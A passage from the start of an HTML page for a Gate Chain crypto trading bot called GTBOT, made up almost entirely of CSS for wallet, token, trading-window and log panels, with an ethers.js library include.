<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GTBOT - Gate Chain Trading Bot</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 25%, #cbd5e1 50%, #94a3b8 75%, #64748b 100%);
            min-height: 100vh;
            color: #1e293b;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 20%, rgba(59, 130, 246, 0.08) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(147, 197, 253, 0.06) 0%, transparent 50%),
                radial-gradient(circle at 40% 60%, rgba(96, 165, 250, 0.04) 0%, transparent 50%);
            animation: backgroundFloat 20s ease-in-out infinite;
            z-index: -1;
        }

        @keyframes backgroundFloat {
            0%, 100% { 
                opacity: 0.8; 
                transform: translateY(0px) rotate(0deg);
            }
            33% { 
                opacity: 1; 
                transform: translateY(-10px) rotate(1deg);
            }
            66% { 
                opacity: 0.9; 
                transform: translateY(5px) rotate(-1deg);
            }
        }

        /* Ê∑ªÂä†Á≤íÂ≠êÊïàÊûú */
        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image: 
                radial-gradient(2px 2px at 20px 30px, rgba(59, 130, 246, 0.1), transparent),
                radial-gradient(2px 2px at 40px 70px, rgba(147, 197, 253, 0.08), transparent),
                radial-gradient(1px 1px at 90px 40px, rgba(96, 165, 250, 0.06), transparent),
                radial-gradient(1px 1px at 130px 80px, rgba(59, 130, 246, 0.04), transparent),
                radial-gradient(2px 2px at 160px 30px, rgba(147, 197, 253, 0.08), transparent);
            background-repeat: repeat;
            background-size: 200px 100px;
            animation: particleMove 30s linear infinite;
            z-index: -1;
        }

        @keyframes particleMove {
            0% { transform: translateY(0px); }
            100% { transform: translateY(-100px); }
        }

        /* Ê∑ªÂä†Èº†Ê†áË∑üÈöèÂÖâÊïà */
        .mouse-glow {
            position: fixed;
            width: 300px;
            height: 300px;
            background: radial-gradient(circle, rgba(59, 130, 246, 0.15) 0%, transparent 70%);
            border-radius: 50%;
            pointer-events: none;
            z-index: -1;
            transition: all 0.1s ease;
            opacity: 0;
        }

        /* Ê∑ªÂä†Âä†ËΩΩÂä®Áîª */
        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(59, 130, 246, 0.3);
            border-radius: 50%;
            border-top-color: #3b82f6;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Ê∑ªÂä†ËÑâÂÜ≤ÊïàÊûú */
        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 40px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 24px;
            backdrop-filter: blur(20px);
            position: relative;
            overflow: hidden;
            box-shadow: 
                0 8px 32px rgba(59, 130, 246, 0.15),
                inset 0 1px 0 rgba(255, 255, 255, 0.8);
        }

        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, rgba(59, 130, 246, 0.15), transparent);
            animation: headerRotate 10s linear infinite;
            z-index: -1;
        }

        @keyframes headerRotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .header h1 {
            font-size: 52px;
            font-weight: 900;
            background: linear-gradient(135deg, #1e40af, #3b82f6, #60a5fa, #1e293b);
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            letter-spacing: 4px;
            margin-bottom: 15px;
            position: relative;
            animation: titleGlow 3s ease-in-out infinite alternate;
        }

        @keyframes titleGlow {
            0% { 
                filter: drop-shadow(0 0 10px rgba(59, 130, 246, 0.3));
            }
            100% { 
                filter: drop-shadow(0 0 20px rgba(59, 130, 246, 0.6));
            }
        }

        .header p {
            color: rgba(30, 41, 59, 0.7);
            font-size: 16px;
            letter-spacing: 1px;
            font-weight: 400;
        }

        .header-content {
            display: flex;
            align-items: center;
            gap: 30px;
            width: 100%;
        }

        .header-bots {
            display: flex;
            align-items: center;
            flex-shrink: 0;
        }

        .header-text {
            flex: 1;
            text-align: center;
        }

        .bot-image {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            transition: all 0.3s;
        }

        .bot-image:hover {
            transform: translateY(-5px) scale(1.05);
        }

        .bot-img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 3px solid rgba(59, 130, 246, 0.3);
            object-fit: cover;
            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.2);
            transition: all 0.3s;
        }

        .bot-img:hover {
            border-color: #3b82f6;
            box-shadow: 0 12px 32px rgba(59, 130, 246, 0.3);
        }


        .stats-panel {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 20px;
            padding: 24px;
            text-align: center;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
            box-shadow: 0 4px 16px rgba(59, 130, 246, 0.1);
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.1), transparent);
            transition: left 0.6s;
        }

        .stat-card:hover::before {
            left: 100%;
        }

        .stat-card:hover {
            transform: translateY(-8px) scale(1.02);
            border-color: #3b82f6;
            box-shadow: 
                0 20px 40px rgba(59, 130, 246, 0.25),
                0 0 0 1px rgba(255, 255, 255, 0.8);
        }

        .stat-icon {
            font-size: 28px;
            margin-bottom: 10px;
        }

        .stat-label {
            font-size: 12px;
            color: rgba(30, 41, 59, 0.6);
            text-transform: uppercase;
            margin-bottom: 5px;
            font-weight: 500;
        }

        .stat-value {
            font-size: 28px;
            font-weight: bold;
            background: linear-gradient(135deg, #3b82f6, #60a5fa);
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
        }

        .active-wallets-status {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 20px;
            padding: 20px 24px;
            margin-bottom: 24px;
            backdrop-filter: blur(15px);
            box-shadow: 0 8px 32px rgba(59, 130, 246, 0.15);
        }

        .status-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .status-title {
            font-size: 14px;
            font-weight: 600;
            color: #3b82f6;
        }

        .status-count {
            background: linear-gradient(135deg, #3b82f6, #60a5fa);
            color: #ffffff;
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: bold;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }

        .status-wallets {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }

        .status-wallet-item {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 12px;
            padding: 8px 12px;
            font-size: 11px;
            font-family: 'Courier New', monospace;
            color: #3b82f6;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .status-wallet-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.1), transparent);
            transition: left 0.5s;
        }

        .status-wallet-item:hover::before {
            left: 100%;
        }

        .status-wallet-item:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
            border-color: #3b82f6;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.15);
        }

        .main-grid {
            display: grid;
            grid-template-columns: 450px 1fr;
            gap: 25px;
            margin-bottom: 25px;
        }

        .panel {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 24px;
            padding: 28px;
            backdrop-filter: blur(20px);
            position: relative;
            overflow: hidden;
            box-shadow: 0 8px 32px rgba(59, 130, 246, 0.1);
        }

        .panel::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.6), transparent);
        }

        .panel-glow {
            box-shadow: 
                0 8px 32px rgba(59, 130, 246, 0.15),
                inset 0 1px 0 rgba(255, 255, 255, 0.8);
        }

        .section-title {
            font-size: 20px;
            margin-bottom: 24px;
            padding-bottom: 12px;
            border-bottom: 1px solid rgba(59, 130, 246, 0.2);
            font-weight: 600;
            background: linear-gradient(135deg, #1e40af, #3b82f6);
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: flex;
            align-items: center;
            gap: 12px;
            position: relative;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: -1px;
            left: 0;
            width: 40px;
            height: 2px;
            background: linear-gradient(90deg, #1e40af, #3b82f6);
            border-radius: 1px;
        }

        .wallet-list {
            max-height: 600px;
            overflow-y: auto;
            padding-right: 10px;
        }

        .wallet-item {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 16px;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 16px rgba(59, 130, 246, 0.08);
        }

        .wallet-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.1), transparent);
            transition: left 0.6s;
        }

        .wallet-item:hover::before {
            left: 100%;
        }

        .wallet-item:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
            border-color: #3b82f6;
            transform: translateX(8px) translateY(-2px);
            box-shadow: 0 12px 24px rgba(59, 130, 246, 0.2);
        }

        .wallet-item.active {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.9));
            border-color: #3b82f6;
            box-shadow: 
                0 8px 32px rgba(59, 130, 246, 0.25),
                inset 0 1px 0 rgba(255, 255, 255, 0.8);
        }

        .wallet-item.active::after {
            content: '‚úì';
            position: absolute;
            top: 12px;
            right: 12px;
            width: 24px;
            height: 24px;
            background: linear-gradient(135deg, #3b82f6, #60a5fa);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: bold;
            color: #ffffff;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
        }

        .wallet-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }

        .wallet-address {
            font-family: 'Courier New', monospace;
            font-size: 13px;
            color: #3b82f6;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            padding: 6px 12px;
            border-radius: 8px;
            border: 1px solid rgba(59, 130, 246, 0.2);
            transition: all 0.3s;
        }

        .wallet-address:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
            border-color: #3b82f6;
            box-shadow: 0 2px 8px rgba(59, 130, 246, 0.15);
        }

        .wallet-balances {
            display: flex;
            gap: 15px;
            margin-bottom: 10px;
            font-size: 14px;
        }

        .balance-item {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .balance-label {
            color: rgba(30, 41, 59, 0.6);
        }

        .balance-value {
            color: #3b82f6;
            font-weight: bold;
        }

        .token-list {
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px solid rgba(59, 130, 246, 0.1);
        }

        .token-list-title {
            font-size: 11px;
            color: rgba(30, 41, 59, 0.5);
            margin-bottom: 8px;
            text-transform: uppercase;
            font-weight: 500;
        }

        .token-item {
            display: grid;
            grid-template-columns: auto 1fr auto auto;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.6), rgba(248, 250, 252, 0.4));
            border: 1px solid rgba(59, 130, 246, 0.15);
            border-radius: 12px;
            margin-bottom: 8px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
            font-size: 13px;
            position: relative;
            overflow: hidden;
        }

        .token-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.1), transparent);
            transition: left 0.5s;
        }

        .token-item:hover::before {
            left: 100%;
        }

        .token-item:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border-color: #3b82f6;
            transform: translateX(6px) translateY(-1px);
            box-shadow: 0 8px 16px rgba(59, 130, 246, 0.15);
        }

        .token-logo {
            width: 28px;
            height: 28px;
            background: linear-gradient(135deg, #ffffff, #f8fafc);
            border: 2px solid rgba(59, 130, 246, 0.3);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 11px;
            font-weight: bold;
            color: #3b82f6;
            box-shadow: 0 4px 8px rgba(59, 130, 246, 0.2);
        }

        .token-info {
            display: flex;
            flex-direction: column;
        }

        .token-symbol {
            font-weight: bold;
            color: #1e293b;
        }

        .token-name {
            font-size: 11px;
            color: rgba(30, 41, 59, 0.6);
        }

        .token-balance {
            color: #3b82f6;
            font-weight: 600;
        }

        .copy-btn {
            padding: 6px 10px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 8px;
            color: #3b82f6;
            font-size: 11px;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .copy-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.1), transparent);
            transition: left 0.4s;
        }

        .copy-btn:hover::before {
            left: 100%;
        }

        .copy-btn:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
            border-color: #3b82f6;
            transform: scale(1.05);
            box-shadow: 0 4px 8px rgba(59, 130, 246, 0.2);
        }

        .toggle-switch {
            position: relative;
            width: 52px;
            height: 28px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border-radius: 28px;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            border: 1px solid rgba(59, 130, 246, 0.2);
        }

        .toggle-switch.active {
            background: linear-gradient(135deg, #3b82f6, #60a5fa);
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }

        .toggle-switch::after {
            content: '';
            position: absolute;
            width: 24px;
            height: 24px;
            background: linear-gradient(135deg, #ffffff, #f8fafc);
            border-radius: 50%;
            top: 2px;
            left: 2px;
            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 2px 8px rgba(59, 130, 246, 0.2);
        }

        .toggle-switch.active::after {
            transform: translateX(24px);
        }

        .add-wallet-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #1e40af, #3b82f6);
            border: none;
            border-radius: 16px;
            color: #ffffff;
            font-weight: bold;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            margin-top: 16px;
            text-transform: uppercase;
            position: relative;
            overflow: hidden;
            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.3);
        }

        .add-wallet-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            transition: left 0.6s;
        }

        .add-wallet-btn:hover::before {
            left: 100%;
        }

        .add-wallet-btn:hover {
            transform: translateY(-4px) scale(1.02);
            box-shadow: 0 16px 40px rgba(59, 130, 246, 0.4);
        }


        .platform-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }

        .platform-tab {
            flex: 1;
            padding: 12px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.6), rgba(248, 250, 252, 0.4));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 10px;
            color: #1e293b;
            cursor: pointer;
            text-align: center;
            transition: all 0.3s;
            font-weight: 600;
        }

        .platform-tab.active {
            background: linear-gradient(135deg, #1e40af, #3b82f6);
            color: #ffffff;
            border-color: transparent;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }

        .dex-options {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
            margin-bottom: 20px;
        }

        .dex-option {
            padding: 15px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.6), rgba(248, 250, 252, 0.4));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 10px;
            cursor: pointer;
            text-align: center;
            transition: all 0.3s;
        }

        .dex-option.selected {
            border-color: #3b82f6;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.2);
        }

        .dex-name {
            font-weight: bold;
            margin-bottom: 5px;
            color: #1e293b;
        }

        .dex-type {
            font-size: 11px;
            color: rgba(30, 41, 59, 0.6);
        }

        /* ÂçèËÆÆÊ†áËØÜÊ†∑Âºè */
        .token-info-protocol {
            margin-top: 8px;
        }

        .protocol-badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 6px;
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .protocol-badge.gtlaunch {
            background: linear-gradient(135deg, #10b981, #059669);
            color: white;
            box-shadow: 0 2px 4px rgba(16, 185, 129, 0.3);
        }

        .protocol-badge.dyor_internal {
            background: linear-gradient(135deg, #8b5cf6, #7c3aed);
            color: white;
            box-shadow: 0 2px 4px rgba(139, 92, 246, 0.3);
        }

        /* ÂêàÁ∫¶‰ΩôÈ¢ùÊòæÁ§∫Ê†∑Âºè */
        .contract-balance-display {
            margin-top: 12px;
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(5, 150, 105, 0.05));
            border: 1px solid rgba(16, 185, 129, 0.2);
            border-radius: 12px;
            padding: 16px;
            backdrop-filter: blur(10px);
        }

        .contract-balance-header {
            margin-bottom: 12px;
        }

        .contract-balance-title {
            font-size: 14px;
            font-weight: 600;
            color: #059669;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .contract-balance-title::before {
            content: 'üí∞';
            font-size: 16px;
        }

        .contract-balance-content {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .balance-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 12px;
            background: rgba(255, 255, 255, 0.6);
            border-radius: 8px;
            border: 1px solid rgba(16, 185, 129, 0.1);
        }

        .balance-label {
            font-size: 12px;
            color: rgba(30, 41, 59, 0.7);
            font-weight: 500;
        }

        .balance-value {
            font-size: 14px;
            font-weight: bold;
            color: #059669;
            text-shadow: 0 0 10px rgba(5, 150, 105, 0.3);
        }

        .control-group {
            display: flex;
            flex-direction: column;
            margin-bottom: 16px;
        }

        .control-group label {
            margin-bottom: 8px;
            font-size: 13px;
            font-weight: 600;
            color: #1e293b;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .control-group input {
            padding: 12px;
            border-radius: 8px;
            border: 1px solid rgba(59, 130, 246, 0.2);
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            color: #1e293b;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s;
        }

        .control-group input:focus {
            outline: none;
            border-color: #3b82f6;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.9));
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2), 0 4px 12px rgba(59, 130, 246, 0.1);
        }

        .gas-speed-btn {
            flex: 1;
            padding: 12px 16px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border: 2px solid rgba(59, 130, 246, 0.2);
            border-radius: 12px;
            color: #3b82f6;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            font-size: 13px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.1);
        }

        .gas-speed-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.1), transparent);
            transition: left 0.5s;
        }

        .gas-speed-btn:hover::before {
            left: 100%;
        }

        .gas-speed-btn:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
            border-color: #3b82f6;
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.2);
        }

        .gas-speed-btn.active {
            background: linear-gradient(135deg, #1e40af, #3b82f6);
            color: #ffffff;
            border-color: transparent;
            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.3);
        }

        .gas-speed-btn:active {
            transform: translateY(0) scale(0.98);
        }

        .expected-returns {
            margin-top: 12px;
            padding: 12px;
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(34, 197, 94, 0.05));
            border: 1px solid rgba(16, 185, 129, 0.2);
            border-radius: 8px;
            animation: slideInDown 0.3s ease-out;
        }

        .expected-returns-content {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .expected-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 13px;
        }

        .expected-label {
            color: rgba(30, 41, 59, 0.7);
            font-weight: 500;
        }

        .expected-value {
            color: #10b981;
            font-weight: bold;
            font-family: 'Courier New', monospace;
        }

        .trading-windows {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin: 20px 0;
        }

        .trading-window {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 16px;
            padding: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(59, 130, 246, 0.1);
            transition: all 0.3s ease;
        }

        .trading-window:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 40px rgba(59, 130, 246, 0.15);
        }

        .buy-window {
            border-left: 4px solid #3b82f6;
        }

        .sell-window {
            border-left: 4px solid #ef4444;
        }

        .window-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid rgba(59, 130, 246, 0.1);
        }

        .window-icon {
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), rgba(96, 165, 250, 0.05));
            border-radius: 50%;
            border: 1px solid rgba(59, 130, 246, 0.2);
            overflow: hidden;
        }

        .sell-window .window-icon {
            background: linear-gradient(135deg, rgba(239, 68, 68, 0.1), rgba(248, 113, 113, 0.05));
            border-color: rgba(239, 68, 68, 0.2);
        }

        .window-icon img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 50%;
        }

        .window-title {
            font-size: 16px;
            font-weight: 700;
            color: #1e293b;
        }

        .window-content {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .window-content .control-group {
            margin-bottom: 0;
        }

        .window-content .control-group label {
            font-size: 13px;
            font-weight: 600;
            color: #1e293b;
            margin-bottom: 8px;
        }

        .window-content .amount-controls {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .window-content .amount-controls input {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid rgba(59, 130, 246, 0.2);
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            color: #1e293b;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s;
        }

        .window-content .amount-controls input:focus {
            outline: none;
            border-color: #3b82f6;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.9));
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
        }

        .window-content .percentage-buttons {
            display: flex;
            gap: 6px;
        }

        .window-content .percentage-btn {
            flex: 1;
            padding: 8px 12px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 8px;
            color: #3b82f6;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 12px;
        }

        .window-content .percentage-btn:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
            border-color: #3b82f6;
            transform: translateY(-1px);
        }

        .window-content .action-btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 10px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 14px;
            text-transform: uppercase;
            margin-top: 8px;
        }

        .window-content .buy-btn {
            background: linear-gradient(135deg, #1e40af, #3b82f6);
            color: #ffffff;
            box-shadow: 0 6px 20px rgba(59, 130, 246, 0.3);
        }

        .window-content .sell-btn {
            background: linear-gradient(135deg, #dc2626, #ef4444);
            color: #ffffff;
            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.3);
        }

        .window-content .action-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
        }

        .window-content .action-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }



        .transaction-log {
            max-height: 400px;
            overflow-y: auto;
        }

        .log-container {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .log-entry {
            padding: 14px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border-radius: 10px;
            font-size: 14px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 12px;
            border-left: 4px solid rgba(59, 130, 246, 0.3);
            transition: all 0.2s;
            box-shadow: 0 2px 8px rgba(59, 130, 246, 0.1);
        }

        .log-entry.success {
            border-left-color: #10b981;
        }

        .log-entry.error {
            border-left-color: #ef4444;
        }

        .log-time {
            color: rgba(30, 41, 59, 0.6);
            font-size: 12px;
            font-weight: 600;
            min-width: 70px;
        }

        .log-message {
            flex: 1;
            color: #1e293b;
            font-weight: 500;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(10px);
        }

        .modal-content {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.9));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 24px;
            padding: 32px;
            width: 90%;
            max-width: 450px;
            box-shadow: 
                0 20px 60px rgba(59, 130, 246, 0.2),
                0 0 0 1px rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(20px);
        }

        .token-details-modal {
            max-width: 500px;
        }

        .modal-title {
            font-size: 26px;
            margin-bottom: 24px;
            background: linear-gradient(135deg, #1e40af, #3b82f6, #1e293b);
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: bold;
        }

        .modal-input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border-radius: 8px;
            border: 1px solid rgba(59, 130, 246, 0.2);
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            color: #1e293b;
            font-family: monospace;
            font-size: 14px;
            transition: all 0.3s;
        }

        .modal-input:focus {
            outline: none;
            border-color: #3b82f6;
            box-shadow: 
                0 0 0 2px rgba(59, 130, 246, 0.2),
                0 4px 12px rgba(59, 130, 246, 0.1);
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
        }

        .modal-input.loading {
            border-color: #3b82f6;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
        }

        .modal-input.error {
            border-color: #ef4444;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(254, 226, 226, 0.6));
            box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.2);
        }

        .modal-input.success {
            border-color: #10b981;
